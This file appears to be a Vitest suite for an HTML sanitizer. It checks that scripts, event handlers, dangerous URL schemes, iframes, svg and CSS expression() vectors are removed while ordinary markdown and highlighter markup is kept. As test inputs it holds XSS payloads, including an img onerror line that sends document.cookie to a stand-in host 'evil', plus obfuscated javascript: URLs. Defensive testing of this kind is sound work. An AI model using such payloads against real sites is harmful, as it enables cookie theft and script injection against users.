import { describe, it, expect } from 'vitest';
import { defaultSanitizer as s } from '../sanitize';

describe('defaultSanitizer', () => {
    describe('script & event-handler XSS', () => {
        it('drops <script> entirely (no text surfaced)', () => {
            expect(s('<script>alert(1)</script>')).toBe('');
            expect(s('before<script>alert(1)</script>after')).toBe('beforeafter');
        });

        it('strips inline event handlers but keeps the element', () => {
            const out = s('<img src="cat.png" onerror="alert(1)">');
            expect(out).toContain('<img');
            expect(out).toContain('src="cat.png"');
            expect(out).not.toContain('onerror');
            expect(out).not.toContain('alert');
        });

        it('strips onclick/onmouseover on any tag', () => {
            const out = s('<p onclick="steal()" onmouseover="x()">hi</p>');
            expect(out).toBe('<p>hi</p>');
        });

        it('neutralises the classic <img onerror> credential-theft payload', () => {
            const out = s(`<img src=x onerror="fetch('//evil?c='+document.cookie)">`);
            expect(out).not.toContain('onerror');
            expect(out).not.toContain('fetch');
        });
    });

    describe('dangerous URL schemes', () => {
        it('drops javascript: hrefs but keeps the link text', () => {
            const out = s('<a href="javascript:alert(1)">click</a>');
            expect(out).toContain('click');
            expect(out).not.toContain('javascript:');
            expect(out).not.toContain('href=');
        });

        it('rejects whitespace/case-obfuscated javascript: schemes', () => {
            for (const url of ['JAVASCRIPT:alert(1)', ' javascript:alert(1)', 'java\tscript:alert(1)', 'vbscript:msgbox(1)']) {
                const out = s(`<a href="${url}">x</a>`);
                expect(out.toLowerCase()).not.toContain('script:');
                expect(out).not.toContain('href=');
            }
        });

        it('keeps safe href schemes and relative/anchor URLs', () => {
            expect(s('<a href="https://example.com">x</a>')).toContain('href="https://example.com"');
            expect(s('<a href="mailto:a@b.com">x</a>')).toContain('href="mailto:a@b.com"');
            expect(s('<a href="/docs/page">x</a>')).toContain('href="/docs/page"');
            expect(s('<a href="#section">x</a>')).toContain('href="#section"');
        });

        it('allows data: URLs only for images, only for image media types', () => {
            const img = s('<img src="data:image/png;base64,iVBORw0KGgo=">');
            expect(img).toContain('src="data:image/png;base64,iVBORw0KGgo="');
            const html = s('<img src="data:text/html,<script>alert(1)</script>">');
            expect(html).not.toContain('data:text/html');
            expect(html).not.toContain('src=');
        });
    });

    describe('dangerous elements', () => {
        it('removes iframe/object/embed/form wholesale', () => {
            expect(s('<iframe src="//evil"></iframe>')).toBe('');
            expect(s('<object data="x"></object>')).toBe('');
            expect(s('<embed src="x">')).toBe('');
            expect(s('<form action="//evil"><input></form>')).toBe('');
        });

        it('removes svg/math (namespace-confusion vectors)', () => {
            expect(s('<svg onload="alert(1)"></svg>')).toBe('');
            expect(s('<svg><script>alert(1)</script></svg>')).toBe('');
        });

        it('unwraps unknown-but-benign tags, keeping sanitized children', () => {
            expect(s('<marquee>hello</marquee>')).toBe('hello');
            expect(s('<unknown><strong>hi</strong></unknown>')).toBe('<strong>hi</strong>');
        });
    });

    describe('legitimate content is preserved', () => {
        it('keeps common markdown HTML intact', () => {
            const md = '<h2>Title</h2><p>A <strong>bold</strong> <a href="https://x.com">link</a> and <code>x</code>.</p><ul><li>one</li></ul>';
            expect(s(md)).toBe(md);
        });

        it('preserves highlighter output (classes + inline style colours)', () => {
            const shiki = '<pre class="shiki" style="background-color:#0d1117"><code><span style="color:#ff7b72">const</span> x</code></pre>';
            const out = s(shiki);
            expect(out).toContain('class="shiki"');
            expect(out).toContain('style="background-color:#0d1117"');
            expect(out).toContain('style="color:#ff7b72"');
        });

        it('keeps inert data-* attributes (DOMPurify-default parity)', () => {
            const out = s('<p data-line="3" data-md="x">hi</p>');
            expect(out).toContain('data-line="3"');
            expect(out).toContain('data-md="x"');
        });

        it('keeps GFM task-list checkboxes', () => {
            const out = s('<li><input type="checkbox" checked disabled> done</li>');
            expect(out).toContain('<input');
            expect(out).toContain('type="checkbox"');
        });

        it('drops inline styles carrying legacy expression()/url(javascript:) vectors', () => {
            const out = s('<p style="color:red;width:expression(alert(1))">x</p>');
            expect(out).toBe('<p>x</p>');
        });

        it('adds rel=noopener to target=_blank links (reverse-tabnabbing)', () => {
            const out = s('<a href="https://x.com" target="_blank">x</a>');
            expect(out).toContain('rel="noopener noreferrer"');
        });
    });

    it('returns empty/falsy input unchanged', () => {
        expect(s('')).toBe('');
    });
});
